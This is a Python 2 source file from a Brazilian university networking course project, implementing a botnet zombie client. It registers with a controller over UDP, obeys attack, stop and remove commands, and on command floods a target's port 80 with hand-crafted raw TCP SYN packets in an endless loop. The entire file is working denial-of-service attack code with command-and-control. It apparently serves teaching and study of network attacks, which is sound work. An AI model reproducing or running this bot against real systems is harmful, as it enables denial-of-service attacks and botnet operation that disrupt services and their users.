# -*- coding: utf-8 -*-
#######################################################################################################
#    UnB - Universidade de Brasília     
#    Departamento de Ciência da Computação                                                               
#    Teleinformática e Redes 2 - 2017/1                                                               
#    Professor: Jacir Luiz Bordim 
#    Projeto Final
#    Integrantes:
#    ==============================================                                                                    
#     Edgar Fabiano de Souza Filho - 14/0019201
#     Ingrid Santana Lopes - 14/0083065
#     Marcos Paulo Cayres Rosa - 14/0027131
#     Paulo Victor Gonçalves Farias - 13/0144754
#     Rennê Ruan Alves Oliveira - 14/0030930                                                                     
#    ==============================================                                     
#        
#    bot_SYN.py = Responsável por enviar os pacotes SYN = 1, para gerar o SYN FLOOD. Esse programa 
#    funciona como um processo zumbi que esteja rodando em uma máquina infectada. Ele é um bot que
#    é controlado pelo Gerente assim que ele entra na rede.                                                                   
#######################################################################################################
import errno
import threading
from socket import *
import sys
import time
from random import randint
from struct import *
serverName = '192.168.0.102'
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_DGRAM)

try:
    clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
except error, e:
    if e[0] == 101:
        print 'Rede inacessivel'

server = ('', 0)
ATACANDO = False
event = threading.Event()

def checksum(msg):
    s = 0
   
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff
     
    return s

def Ataque():
    try:
        s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    except error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()
 
    s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
         

    packet = '';
     
    source_ip = '192.168.0.119'
    dest_ip = '192.168.0.102'  # vitima do ataque
     
    # cabecalhos fixos do ip
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   
    frag_off = 0
    ttl = 64
    protocol = IPPROTO_TCP
    check = 10  
    saddr = inet_aton ( source_ip )  
    daddr = inet_aton ( dest_ip )
     
    ihl_version = (version << 4) + ihl

    # cabecalhos fixos do tcp
    dest = 80   # porta de destino atacada
    doff = 5    
    #tcp flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = htons (5840)    
    check = 0
    urg_ptr = 0
    source = 1063   # porta de origem
    seq = 0
    ack_seq = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    print 'Enviando ataque para ' + dest_ip
    while 1: #loop do ataque
        event.wait()
        #cabecalho variavel do IP
        id =randint(0,65534)  

        #pacote do cabecalho do ip
        ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)


        #cabecalho variavel do tcp
        if source >= 65534:
            source = 0
        source+=1
        seq+=1
        ack_seq=randint(0,4294967294)
        
        #pacote do cacecho do tcp
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
         
        # cabecalho falso
        source_address = inet_aton( source_ip )
        dest_address = inet_aton(dest_ip)
        placeholder = 0
        protocol = IPPROTO_TCP
        tcp_length = len(tcp_header)
         
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
        psh = psh + tcp_header;
         
        tcp_checksum = checksum(psh)
        
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
         
        # pacote final (nao tem o campo de dados)
        packet = ip_header + tcp_header
        
        print 'enviando pacote ' + str(id)
        #Envia o pacote
        s.sendto(packet, (dest_ip, 0))
        #time.sleep(1)
        

def ThreadEnvio():
    ATACANDO = False
    t = threading.Thread(target = Ataque, args=())
    t.daemon = True 
    print 'Tentando conectar-se ao gerente'
    while True:
        try:
            rcv, serverAddress = clientSocket.recvfrom(2048) 
        except error, e:
            if e[0] == errno.WSAECONNRESET:
                print 'Gerente desconectado'
                continue

        if rcv == 'acc':
            print 'Conectado ao gerente'

        if rcv == 'atk':
            ATACANDO = True
            if t.isAlive() == False:
                t.start();
            event.set()

        if rcv == 'stp':
            print 'Parando ataque'
            ATACANDO = False
            event.clear()
            
        if rcv == 'rem':
            event.clear()
            print 'Botnet desconectada'
            raise SystemExit

try:
    thread = threading.Thread(target = ThreadEnvio, args=())
    thread.daemon = True 
    thread.start();
    while thread.isAlive(): 
        thread.join(1)

except KeyboardInterrupt, SystemExit:
    print 'Saindo...'
    clientSocket.sendto('off'+gethostname(), (serverName, serverPort)) 
    clientSocket.close()      

    exit(0)
